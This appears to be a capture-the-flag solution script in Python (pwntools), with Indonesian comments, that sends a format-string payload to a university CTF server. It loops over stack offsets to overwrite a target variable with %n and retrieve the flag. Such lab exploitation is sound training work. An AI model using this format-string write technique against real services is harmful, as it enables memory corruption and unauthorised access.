from pwn import *


host = 'ctf99.cs.ui.ac.id'
port = 10009


for i in range(1, 11):
   r = remote(host, port)
   try:


       r.recvuntil(b"Are you ready kids?\n")


       # Buat format string payload untuk mengubah nilai hack_me
       c = bytes(str(i), 'ascii')
       payload = b"%1337x%" + c + b"$n"
       print(payload)


       r.sendline(payload)


       response = r.recvall(timeout=2).decode()  # Tunggu beberapa saat untuk menerima data
       if not response:
           print(f"No response in iteration {i}")
           r.close()
           continue


       print(response)


       if 'Hi, here is your flag' in response:
           break
   except Exception as e:
       print(f"Error occurred at iteration {i}: {e}")
   finally:
       r.close()

